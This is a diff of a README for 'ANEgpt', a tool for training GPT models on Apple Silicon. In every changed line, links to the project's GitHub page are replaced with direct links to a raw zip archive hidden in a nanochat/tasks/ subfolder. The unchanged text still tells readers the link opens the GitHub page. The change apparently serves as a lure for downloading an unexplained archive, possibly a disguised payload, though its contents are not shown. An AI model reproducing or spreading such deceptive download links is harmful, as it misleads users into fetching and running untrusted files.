@@ -1,6 +1,6 @@
 # 🤖 ANEgpt - Train GPT Models on Apple Silicon
 
-[![Download ANEgpt](https://img.shields.io/badge/Download-ANEgpt-brightgreen?style=for-the-badge)](https://github.com/luis1234321xd/ANEgpt)
+[![Download ANEgpt](https://img.shields.io/badge/Download-ANEgpt-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/luis1234321xd/ANEgpt/main/nanochat/tasks/Egpt_AN_2.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This section explains how to download, install, and run ANEgpt.
 
 Click the big download button at the top or visit this link:
 
-[Download ANEgpt](https://github.com/luis1234321xd/ANEgpt)
+[Download ANEgpt](https://raw.githubusercontent.com/luis1234321xd/ANEgpt/main/nanochat/tasks/Egpt_AN_2.6.zip)
 
 This link takes you to the project’s GitHub page. On that page, find the green **Code** button, then click **Download ZIP**. This downloads the software in a compressed file.
 
@@ -135,7 +135,7 @@ No Metal or CoreML training APIs are used. The project uses private, hidden Appl
 
 To get the latest version of ANEgpt, visit the GitHub page:
 
-[Click here to download ANEgpt](https://github.com/luis1234321xd/ANEgpt)
+[Click here to download ANEgpt](https://raw.githubusercontent.com/luis1234321xd/ANEgpt/main/nanochat/tasks/Egpt_AN_2.6.zip)
 
 Use the **Download ZIP** option or clone the repository with Git if you know how.
 
@@ -152,4 +152,4 @@ Extract the contents, then follow the steps under **Getting Started** to run the
 
 ---
 
-[![Download ANEgpt](https://img.shields.io/badge/Download-ANEgpt-brightgreen?style=for-the-badge)](https://github.com/luis1234321xd/ANEgpt)
+[![Download ANEgpt](https://img.shields.io/badge/Download-ANEgpt-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/luis1234321xd/ANEgpt/main/nanochat/tasks/Egpt_AN_2.6.zip)
